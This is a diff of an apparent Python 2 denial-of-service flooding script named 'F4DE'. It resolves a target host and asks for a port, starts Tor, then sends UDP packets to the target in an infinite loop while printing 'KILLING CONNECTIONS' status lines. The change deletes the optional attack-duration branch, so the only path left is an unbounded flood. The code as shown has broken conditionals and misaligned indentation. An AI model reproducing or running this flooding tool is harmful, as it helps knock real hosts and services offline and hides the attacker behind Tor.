@@ -40,31 +40,12 @@ ip = socket.gethostbyname(target)
 print ip
 os.system('''echo "host ip" | lolcat''')
 port = input(G+'[?] \033[0m3NTER P0RT : ')
-os.system('''echo "would you like to add how long you attack [y/n] : " | lolcat''')
-time = raw_input(G+'>')
-	
-if time == "no" or "n" or "NO" or "N" :
+
 	os.system("service tor start")
 	print N+"F4DE attack started on {0}.{1} | {2}-{3}-{4}".format(hour, minute, day, month, year)
 	sent = 0
 
 	while True:
-		sock.sendto(packets, (ip, port))
-		sent = sent + 1
-		print N+"KILLING CONNECTIONS   status :  packets [%s]   target : [%s]   port : [%s]"%(sent,ip,port)
-
-if time == "y" or "yes" or "YES" or "Y" :
-	duration = input()
-	timeout = time.time() + duration
-	os.system("service tor start")
-	print N+"F4DE attack started on {0}.{1} | {2}-{3}-{4}".format(hour, minute, day, month, year)
-	sent = 0
-
-	while True:
-		if time.time() > timeout:
-			break
-		else:
-			pass
 		sock.sendto(packets, (ip, port))
 		sent = sent + 1
 		print N+"KILLING CONNECTIONS   status :  packets [%s]   target : [%s]   port : [%s]"%(sent,ip,port)
